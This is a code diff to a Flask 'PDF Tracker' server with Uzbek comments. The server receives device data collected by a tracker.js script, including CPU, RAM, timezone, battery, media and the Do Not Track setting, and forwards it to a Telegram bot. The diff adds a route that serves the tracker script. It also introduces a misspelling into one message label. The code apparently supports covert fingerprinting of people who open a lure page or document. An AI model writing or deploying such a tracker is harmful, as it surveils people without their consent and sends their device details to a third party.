@@ -6,7 +6,8 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-app = Flask(__name__)
+# Flask ilovasini loyiha ildizidagi index.html va tracker.js uchun sozlash
+app = Flask(__name__, static_folder='.', template_folder='.')
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
@@ -72,7 +73,7 @@ def track_data():
         f"⚙️ CPU: `{data.get('cpu', 'unknown')}`\n"
         f"🧠 RAM: `{data.get('ram', 'unknown')}`\n"
         f"⏰ Vaqt zonasi: `{data.get('timezone', 'unknown')}`\n"
-        f"🕒 Mahalliy vaqt: `{data.get('localTime', 'unknown')}`\n"
+        f"🕒 Mahliy vaqt: `{data.get('localTime', 'unknown')}`\n"
         f"🚫 Do Not Track: `{data.get('doNotTrack', 'unknown')}`\n"
         f"🔋 Batareya: `{data.get('battery', 'unknown')}`\n"
         f"📹 Media: `{data.get('media', 'unknown')}`\n"
@@ -121,6 +122,11 @@ def track_data():
 @app.route('/')
 def home():
     return render_template("index.html") if os.path.exists("index.html") else "✅ PDF Tracker Flask server ishlayapti."
+
+# tracker.js faylini loyiha ildizidan yuborish
+@app.route('/tracker.js')
+def serve_tracker():
+    return send_file("tracker.js", mimetype="application/javascript")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
